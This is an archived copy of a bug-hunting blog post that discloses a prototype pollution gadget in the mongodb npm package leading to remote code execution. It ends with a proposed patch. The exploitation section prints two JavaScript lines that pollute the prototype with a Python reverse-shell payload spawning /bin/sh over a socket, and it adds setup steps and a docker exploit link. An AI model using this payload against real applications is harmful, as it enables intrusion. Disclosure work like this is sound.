---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-06-17_brand-new-prototype-pollution-gadget-in-mongodb-leading-to-rce.md
original_filename: 2024-06-17_brand-new-prototype-pollution-gadget-in-mongodb-leading-to-rce.md
title: Brand-new prototype pollution gadget in MongoDB leading to RCE
category: documents
detected_topics:
- supply-chain
- command-injection
- xss
tags:
- imported
- documents
- supply-chain
- command-injection
- xss
language: en
raw_sha256: 1574cbd8a66bf0f88aa55cd6ed31baa70f4bc16248e9dceb380c95d4af244dd0
text_sha256: 114eb513abae4eae659f12b07ec120f588253570885b12f5059621626d4b1da2
ingested_at: '2026-06-28T07:32:34Z'
sensitivity: unknown
redactions_applied: false
---

# Brand-new prototype pollution gadget in MongoDB leading to RCE

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-06-17_brand-new-prototype-pollution-gadget-in-mongodb-leading-to-rce.md
- Source Type: markdown
- Detected Topics: supply-chain, command-injection, xss
- Ingested At: 2026-06-28T07:32:34Z
- Redactions Applied: False
- Raw SHA256: `1574cbd8a66bf0f88aa55cd6ed31baa70f4bc16248e9dceb380c95d4af244dd0`
- Text SHA256: `114eb513abae4eae659f12b07ec120f588253570885b12f5059621626d4b1da2`


## Content

---
title: "Brand-new prototype pollution gadget in MongoDB leading to RCE"
url: "https://infosecwriteups.com/brand-new-prototype-pollution-gadget-in-mongodb-leading-to-rce-8c5e0087c15e"
authors: ["Vuusale"]
programs: ["MongoDB"]
bugs: ["RCE", "Prototype pollution"]
publication_date: "2024-06-17"
added_date: "2024-07-22"
source: "pentester.land/writeups.json"
original_index: 243
scraped_via: "browseros"
---

# Brand-new prototype pollution gadget in MongoDB leading to RCE

Brand-new prototype pollution gadget in MongoDB leading to RCE
Vuusale
Follow
4 min read
·
Jun 17, 2024

82

Recently, I uncovered a new prototype pollution gadget in mongodb NPM package version 6.6.2, that results in Remote Code Execution (RCE). Despite the excitement of this discovery, my report was closed as “informative” because its exploitation depends on the application using this library. Regardless, I want to share the specifics of my finding, its implications, and why I believe it warrants more attention. The package is still vulnerable, therefore application developers should be made aware of it, even though it can also be abused for evil purposes!

What is prototype pollution?

Prototype pollution is a JavaScript-specific vulnerability that allows to inject arbitrary properties into global object prototype. If these properties are later used by the application in unsafe ways, it can open up an opportunity for other types of attacks such as authentication bypass, XSS, and even RCE. For more details, check Portswigger’s article about this topic.

To be able to obtain RCE with prototype pollution, we need 3 components:

Sink — a dangerous JavaScript function that executes arbitrary code. For example, eval, child_process.exec, etc.
Gadget — a property passed into a sink without sanitization.
Source — an entry point to the application for polluting the prototype with vulnerable property.

Even when a web application has a prototype pollution source, this vulnerability alone does not constitute any risk unless it can be combined with a valid gadget and sink to create a significant impact. The trick here is that gadget and sink don’t have to reside in the application’s own code base, but can also arise in its dependencies. We just need to pollute properties that are handled insecurely somewhere for escalating to other vulnerabilities.

Prototype pollution
Discovery

To discover the prototype pollution gadget in mongodb NPM library, I first pinpointed the dangerous sink, then traced back its arguments to determine potential gadgets. It exists within the mongodb/lib/client-side-encryption/mongocryptd_manager.js file, responsible for client-side encryption of specific data fields:

Press enter or click to view image in full size
Vulnerable sink

In line 37, cmdName and this.spawnArgs arguments are passed into spawn function imported from child_process library. cmdName variable is declared in line 32 with the value of this.spawnPath. Let’s analyze where these properties come from.

Press enter or click to view image in full size
Vulnerable gadgets

In line 16, we see that this.spawnPath is set to extraOptions.mongocryptdSpawnPath or empty string. In line 19, extraOptions.mongocryptdSpawnArgs is used to populate this.spawnArgs array. The class constructor doesn’t check whether these properties exist in extraOptions object before referencing them. That’s why, the application will search for those properties in the global object prototype, if it doesn’t find them in extraOptions object. That creates a useful gadget to reach spawn call with prototype pollution, enabling us to run any binary with arbitrary options.

Exploitation

To simulate a prototype pollution exploit, I set up an example Node.js application that creates a MongoDB database connection with client-side encryption: https://pastebin.com/YAewQa3f

Get Vuusale’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

The following lines pollutes the prototype before MongoClient class is initialized:

autoEncryption.__proto__.mongocryptdSpawnPath = "python";
autoEncryption.__proto__.mongocryptdSpawnArgs = ['-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'];

mongocryptdSpawnPath property specifies the binary to be run, while mongocryptdSpawnArgs indicates CLI arguments. The result:

Press enter or click to view image in full size
Reverse shell

As you can see, “ — idleShutdownTimeoutSecs” and “60” arguments were also appended to the executed command by the library. This might cause unknown option error with some binaries such as curl. To get around this issue, I added “-d” option after URL which turns this dangling option to the request’s body and prevents the exploit from failing:

Workaround for dangling option

Overall steps:

Install mongodb and mongodb-client-encryption packages: npm install mongodb mongodb-client-encryption.
Create netcat listener.
Run the Node.js program.

Alternatively, follow the steps here to pull and run the fully-setup docker image for this exploit: https://github.com/vuusale/proto-gadget-mongodb

Whenever you encounter a prototype pollution in a Node.js application using MongoDB, you can easily set the properties described above and achieve RCE.

Remediation

Although MongoDB refused to award a bounty for this finding, I chose not to debate with the HackerOne team about why MongoDB should take responsibility for fixing this vulnerability instead of placing all the burden on developers using the library. Instead, I rolled up my sleeves, implemented a patch, and created a pull request in their Github repository. The simple solution I proposed is the following:

Press enter or click to view image in full size
Solution to avoid null reference

The code I added ensures that mongocryptdSpawnPath and mongocryptdSpawnArgs properties exist in the extraOptions object, before assigning them to this.spawnPath and this.spawnArgs.

I still don’t understand why such prototype pollution gadgets continue to exist if most of them can be easily fixed by adding a few lines of code.

Conclusion

That’s all about my latest bug hunting adventure. Be careful when using mongodb package in your Node.js app, as it contains a ticking time bomb 😄 Stay safe and secure!
